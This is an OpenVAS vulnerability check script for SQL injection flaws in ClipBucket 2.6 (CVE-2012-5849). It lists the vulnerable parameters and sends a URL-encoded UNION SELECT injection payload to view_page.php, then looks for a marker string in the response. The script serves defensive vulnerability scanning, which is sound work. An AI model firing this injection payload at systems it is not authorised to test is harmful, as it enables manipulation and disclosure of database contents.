###############################################################################
# OpenVAS Vulnerability Test
#
# ClipBucket Multiple SQL Injection Vulnerabilities
#
# Authors:
# Deependra Bapna <bdeepednra@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:clipbucket_project:clipbucket";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805388");
  script_version("2020-05-08T08:34:44+0000");
  script_cve_id("CVE-2012-5849");
  script_bugtraq_id(56854);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)");
  script_tag(name:"creation_date", value:"2015-05-21 14:14:28 +0530 (Thu, 21 May 2015)");
  script_name("ClipBucket Multiple SQL Injection Vulnerabilities");

  script_tag(name:"summary", value:"The host is installed with ClipBucket
  and is prone to multiple sql injection vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Multiple Flaws are due to,

  - 'user_contacts.php' and 'view_channel.php' scripts are not properly
    sanitizing  user-supplied input via the 'user' parameter.

  - 'ajax.php' script is not properly sanitizing user-supplied input via the
    'uid', 'id', 'cid', and 'ci_id' parameters.

  - 'view_page.php' script not properly sanitizing user-supplied input to
    the 'pid' parameter.

  - 'view_topic.php' script is not properly sanitizing user-supplied input to
    the 'tid' parameter.

  - 'watch_video.php' script is not properly sanitizing user-supplied input to
    the 'v' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name: "affected", value:"ClipBucket version 2.6 Revision 738 and
  earlier.");

  script_tag(name:"solution", value:"Apply the patch from the referenced link.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/23252");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23125");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_clipbucket_detect.nasl");
  script_mandatory_keys("clipbucket/Installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://clip-bucket.com");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/clipbucket/files/Patches");
  exit(0);
}


include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

if( dir == "/" ) dir = "";

url = dir + "/view_page.php?pid=0%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2"
          + "Cconcat(0x53514c2d496e6a656374696f6e2d54657374)"
          + "%2C7%2C8%2C9%2C10%20--%202";

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                   pattern:"SQL-Injection-Test<",
                   extra_check: make_list("Login", ">ClipBucket")))
{
  report = http_report_vuln_url(port:http_port, url:url);
  security_message(port:http_port, data:report);
  exit(0);
}

exit(99);
